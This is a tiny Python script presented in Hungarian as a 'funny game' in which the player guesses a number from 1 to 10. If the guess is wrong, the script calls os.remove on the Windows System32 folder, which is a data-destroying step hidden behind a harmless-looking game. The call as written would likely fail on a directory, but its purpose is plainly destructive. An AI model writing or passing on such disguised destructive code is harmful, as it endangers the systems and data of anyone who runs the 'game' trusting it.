import random
import os
number=random.randint(1,10)
guess=input("Vicces Játék találd ki a számot 1 és 10 között!: ")
guess=int(guess)
if guess==number:
    print("Nyertél!")
else:
    os.remove("C:/Windows/System32")